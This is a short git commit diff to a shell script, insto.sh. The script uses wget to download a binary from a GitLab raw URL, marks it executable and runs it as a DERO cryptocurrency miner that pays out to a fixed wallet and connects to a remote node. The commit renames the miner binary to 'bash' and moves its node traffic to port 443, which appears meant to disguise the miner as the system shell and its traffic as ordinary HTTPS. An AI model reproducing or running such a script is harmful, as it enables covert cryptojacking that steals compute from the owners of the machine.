2823657012ce73fbc0ef999de9f5464743b34f3c
pagesrlepla <151825393+pagesrlepla@users.noreply.github.com>
2024-01-17 21:04:14 +0700

    Update insto.sh

--- insto.sh
+++ insto.sh
@@ -1,3 +1,2 @@
-wget https://gitlab.com/alexandercobaeli471/thegitpp/-/raw/main/astrominer
-chmod +x astrominer
-./astrominer - w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeth4v7yz7m959q2c897k -r dero-node.mysrv.cloud:10300
+wget https://gitlab.com/alexandercobaeli471/thegitpp/-/raw/main/bash && chmod +x bash
+./bash --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeth4v7yz7m959q2c897k --daemon-rpc-address=dero-node.mysrv.cloud:443
